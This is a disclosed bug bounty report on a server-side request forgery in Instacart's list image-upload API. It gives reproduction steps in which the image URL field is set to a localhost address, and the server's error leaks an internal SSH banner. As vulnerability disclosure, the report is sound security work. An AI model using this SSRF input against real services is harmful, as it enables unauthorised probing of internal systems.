# Server side request forgery on image upload for lists

## Report Details
- **Report ID**: 158016
- **URL**: https://hackerone.com/reports/158016
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-09T23:44:41.943Z
- **Disclosed**: 2016-10-12T21:11:01.088Z

## Reporter
- **Username**: eboda
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Summary
----------

There is a Server-side request forgery when updating the image for a list.

Steps to reproduce
-----------------

1. Create a list and change its image. That will send a POST request to https://beta.instacart.com/api/v2/lists/[LIST_ID] with the following parameters:

    ```
list[remote_image_url]=https://example.com/yourimage.jpg
```

2. Change the  url to http://127.0.0.1:21 and you will get as response:

    ```{json}
{
	"meta":
	{
		"code": 400,
		"error_type": "List Error",
		"error_message": "There was an error while updating this list",
		"errors": ["Image could not download file: wrong status line: \"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3\""]
	}
}
```
    Which shows that it tried to connect to the SSH port on localhost.  


## Attachments
No attachments
